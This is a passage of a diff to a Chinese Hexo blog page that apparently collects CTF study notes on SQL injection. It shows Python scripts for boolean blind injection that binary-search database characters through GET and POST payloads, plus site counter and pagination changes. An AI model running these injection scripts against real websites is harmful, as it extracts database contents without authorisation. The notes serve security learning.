class="number">1</span>):</span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line">        pyload=<span class="string">f&quot;and ascii(substr((select database()),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span> --+&quot;</span></span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> requests.get(url=url+bihe+pyload).text:</span><br><span class="line">            left=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> left==right:</span><br><span class="line">            table += <span class="built_in">chr</span>(mid)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right=mid</span><br><span class="line"><span class="built_in">print</span>(table)</span><br></pre></td></tr></table></figure></li>
 </ol>
 <h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><ol>
@@ -575,7 +786,7 @@
 </ol>
 <h2 id="布尔盲注-1"><a href="#布尔盲注-1" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><ol>
 <li><strong>判断条件</strong><br>如果条件是以图片的形式显示的,需要写成<code>相对路径.jpg</code>,例如<code>../images/flag.jpg</code>(两个小数点<code>..</code>表示上一个目录)</li>
-<li><strong>二分法脚本</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;地址&#x27;</span></span><br><span class="line">table = <span class="string">&quot;&quot;</span>  <span class="comment"># 储存数据</span></span><br><span class="line">flag=<span class="string">&#x27;../images/flag.jpg&#x27;</span> <span class="comment">#真值条件</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    left = <span class="number">31</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    mid = (left + right) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> (left &lt; right):</span><br><span class="line">        date = &#123;</span><br><span class="line">            <span class="string">&quot;uname&quot;</span>: <span class="string">f&quot;1&#x27; or ascii (substr((查询条件),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span> #&quot;</span>,  <span class="comment"># post要提交的数据</span></span><br><span class="line">            <span class="string">&quot;passwd&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Submit&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> requests.post(url=url, data=date).text: <span class="comment"># 注意,这里要判断基本延迟</span></span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line">    table = table + <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(table)</span><br></pre></td></tr></table></figure></li>
+<li><strong>二分法脚本</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;地址&#x27;</span></span><br><span class="line">table = <span class="string">&quot;&quot;</span>  <span class="comment"># 储存数据</span></span><br><span class="line">flag=<span class="string">&#x27;../images/flag.jpg&#x27;</span> <span class="comment">#真值条件</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    left = <span class="number">31</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    mid = (left + right) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> (left &lt; right):</span><br><span class="line">        date = &#123;</span><br><span class="line">            <span class="string">&quot;uname&quot;</span>: <span class="string">f&quot;1&#x27; or ascii (substr((查询条件),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span> #&quot;</span>,  <span class="comment"># post要提交的数据</span></span><br><span class="line">            <span class="string">&quot;passwd&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Submit&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> requests.post(url=url, data=date).text: <span class="comment"># 注意,这里要判断基本延迟</span></span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line">    table = table + <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(table)</span><br><span class="line">    <span class="comment">#time.sleep(0.5)</span></span><br></pre></td></tr></table></figure></li>
 </ol>
 <h1 id="头文件注入"><a href="#头文件注入" class="headerlink" title="头文件注入"></a>头文件注入</h1><ol>
 <li>如果网站记录了浏览信息或者是IP信息之类,就有可能存在头注入</li>
@@ -1602,94 +1813,10 @@ __NAMESPACE__
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/08/hello-world/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/hearder.jpg">
-      <meta itemprop="name" content="？？喵！！">
-      <meta itemprop="description" content="瞄一下学过代码，写一个睡喵的博客">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="睡猫的博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/03/08/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-03-08 21:12:52" itemprop="dateCreated datePublished" datetime="2023-03-08T21:12:52+08:00">2023-03-08</time>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>367</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -1757,14 +1884,14 @@ __NAMESPACE__
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">20</span>
+          <span class="site-state-item-count">21</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-count">8</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
@@ -1807,13 +1934,13 @@ __NAMESPACE__
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">80k</span>
+    <span title="站点总字数">83k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">4:46</span>
+    <span title="站点阅读时长">4:56</span>
 </div>
 
 <!--
